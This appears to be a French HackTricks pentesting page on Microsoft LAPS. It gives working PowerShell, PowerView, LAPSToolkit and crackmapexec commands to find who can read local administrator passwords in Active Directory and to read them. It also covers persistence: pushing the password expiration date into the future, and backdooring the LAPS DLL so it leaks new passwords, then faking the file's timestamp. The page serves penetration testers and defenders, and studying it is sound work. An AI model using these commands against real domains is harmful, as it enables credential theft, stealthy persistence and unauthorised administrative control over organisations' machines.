# LAPS

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? Ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au [repo hacktricks](https://github.com/carlospolop/hacktricks) et au [repo hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

## Informations de base

**LAPS** vous permet de **gérer le mot de passe administrateur local** (qui est **aléatoire**, unique et **changé régulièrement**) sur les ordinateurs joints au domaine. Ces mots de passe sont stockés de manière centralisée dans Active Directory et restreints aux utilisateurs autorisés à l'aide des ACL. Les mots de passe sont protégés en transit du client vers le serveur à l'aide de Kerberos v5 et AES.

Lors de l'utilisation de LAPS, **2 nouveaux attributs** apparaissent dans les **objets d'ordinateur** du domaine : **`ms-mcs-AdmPwd`** et **`ms-mcs-AdmPwdExpirationTime`**_. Ces attributs contiennent le **mot de passe administrateur en texte clair et l'heure d'expiration**. Ensuite, dans un environnement de domaine, il pourrait être intéressant de vérifier **quels utilisateurs peuvent lire** ces attributs.

### Vérifier si activé
```bash
reg query "HKLM\Software\Policies\Microsoft Services\AdmPwd" /v AdmPwdEnabled

dir "C:\Program Files\LAPS\CSE"
# Check if that folder exists and contains AdmPwd.dll

# Find GPOs that have "LAPS" or some other descriptive term in the name
Get-DomainGPO | ? { $_.DisplayName -like "*laps*" } | select DisplayName, Name, GPCFileSysPath | fl

# Search computer objects where the ms-Mcs-AdmPwdExpirationTime property is not null (any Domain User can read this property)
Get-DomainObject -SearchBase "LDAP://DC=sub,DC=domain,DC=local" | ? { $_."ms-mcs-admpwdexpirationtime" -ne $null } | select DnsHostname
```
### Accès au mot de passe LAPS

Vous pouvez **télécharger la stratégie LAPS brute** à partir de `\\dc\SysVol\domain\Policies\{4A8A4E8E-929F-401A-95BD-A7D40E0976C8}\Machine\Registry.pol` puis utiliser **`Parse-PolFile`** du package [**GPRegistryPolicyParser**](https://github.com/PowerShell/GPRegistryPolicyParser) pour convertir ce fichier en un format lisible par l'homme.

De plus, les **cmdlets PowerShell natifs de LAPS** peuvent être utilisés s'ils sont installés sur une machine à laquelle nous avons accès:
```powershell
Get-Command *AdmPwd*

CommandType     Name                                               Version    Source
-----------     ----                                               -------    ------
Cmdlet          Find-AdmPwdExtendedRights                          5.0.0.0    AdmPwd.PS
Cmdlet          Get-AdmPwdPassword                                 5.0.0.0    AdmPwd.PS
Cmdlet          Reset-AdmPwdPassword                               5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdAuditing                                 5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdComputerSelfPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdReadPasswordPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdResetPasswordPermission                  5.0.0.0    AdmPwd.PS
Cmdlet          Update-AdmPwdADSchema                              5.0.0.0    AdmPwd.PS

# List who can read LAPS password of the given OU
Find-AdmPwdExtendedRights -Identity Workstations | fl

# Read the password
Get-AdmPwdPassword -ComputerName wkstn-2 | fl
```
**PowerView** peut également être utilisé pour découvrir **qui peut lire le mot de passe et le lire** :
```powershell
# Find the principals that have ReadPropery on ms-Mcs-AdmPwd
Get-AdmPwdPassword -ComputerName wkstn-2 | fl

# Read the password
Get-DomainObject -Identity wkstn-2 -Properties ms-Mcs-AdmPwd
```
### LAPSToolkit

Le [LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit) facilite l'énumération des LAPS avec plusieurs fonctions.\
L'une d'entre elles est l'analyse des **`ExtendedRights`** pour **tous les ordinateurs avec LAPS activé**. Cela montrera les **groupes** spécifiquement **délégués pour lire les mots de passe LAPS**, qui sont souvent des utilisateurs dans des groupes protégés.\
Un **compte** qui a **rejoint un ordinateur** à un domaine reçoit `Tous les droits étendus` sur cet hôte, et ce droit donne au **compte** la capacité de **lire les mots de passe**. L'énumération peut montrer un compte utilisateur qui peut lire le mot de passe LAPS sur un hôte. Cela peut nous aider à **cibler des utilisateurs AD spécifiques** qui peuvent lire les mots de passe LAPS.
```powershell
# Get groups that can read passwords
Find-LAPSDelegatedGroups

OrgUnit                                           Delegated Groups
-------                                           ----------------
OU=Servers,DC=DOMAIN_NAME,DC=LOCAL                DOMAIN_NAME\Domain Admins
OU=Workstations,DC=DOMAIN_NAME,DC=LOCAL           DOMAIN_NAME\LAPS Admin

# Checks the rights on each computer with LAPS enabled for any groups
# with read access and users with "All Extended Rights"
Find-AdmPwdExtendedRights
ComputerName                Identity                    Reason
------------                --------                    ------
MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\Domain Admins   Delegated
MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\LAPS Admins     Delegated

# Get computers with LAPS enabled, expirations time and the password (if you have access)
Get-LAPSComputers
ComputerName                Password       Expiration
------------                --------       ----------
DC01.DOMAIN_NAME.LOCAL      j&gR+A(s976Rf% 12/10/2022 13:24:41
```
## **Extraction des mots de passe LAPS avec Crackmapexec**
Si vous n'avez pas accès à PowerShell, vous pouvez exploiter ce privilège à distance via LDAP en utilisant
```
crackmapexec ldap 10.10.10.10 -u user -p password --kdcHost 10.10.10.10 -M laps
```
Cela permettra de récupérer tous les mots de passe que l'utilisateur peut lire, vous permettant ainsi d'obtenir une meilleure empreinte avec un utilisateur différent.

## **Persistance LAPS**

### **Date d'expiration**

Une fois administrateur, il est possible d'**obtenir les mots de passe** et d'**empêcher** une machine de **mettre à jour** son **mot de passe** en **définissant la date d'expiration dans le futur**.
```powershell
# Get expiration time
Get-DomainObject -Identity computer-21 -Properties ms-mcs-admpwdexpirationtime

# Change expiration time
## It's needed SYSTEM on the computer
Set-DomainObject -Identity wkstn-2 -Set @{"ms-mcs-admpwdexpirationtime"="232609935231523081"}
```
{% hint style="warning" %}
Le mot de passe sera toujours réinitialisé si un **administrateur** utilise la commande **`Reset-AdmPwdPassword`** ; ou si **Ne pas autoriser une durée d'expiration du mot de passe plus longue que celle requise par la stratégie** est activé dans la GPO LAPS.
{% endhint %}

### Backdoor

Le code source original de LAPS peut être trouvé [ici](https://github.com/GreyCorbel/admpwd), il est donc possible d'insérer une porte dérobée dans le code (à l'intérieur de la méthode `Get-AdmPwdPassword` dans `Main/AdmPwd.PS/Main.cs` par exemple) qui permettra d'une manière ou d'une autre de **faire sortir de nouveaux mots de passe ou de les stocker quelque part**.

Ensuite, il suffit de compiler le nouveau fichier `AdmPwd.PS.dll` et de le télécharger sur la machine dans `C:\Tools\admpwd\Main\AdmPwd.PS\bin\Debug\AdmPwd.PS.dll` (et de modifier l'heure de modification).

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Vous travaillez dans une **entreprise de cybersécurité** ? Vous souhaitez voir votre **entreprise annoncée dans HackTricks** ? ou souhaitez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au référentiel [hacktricks](https://github.com/carlospolop/hacktricks) et [hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
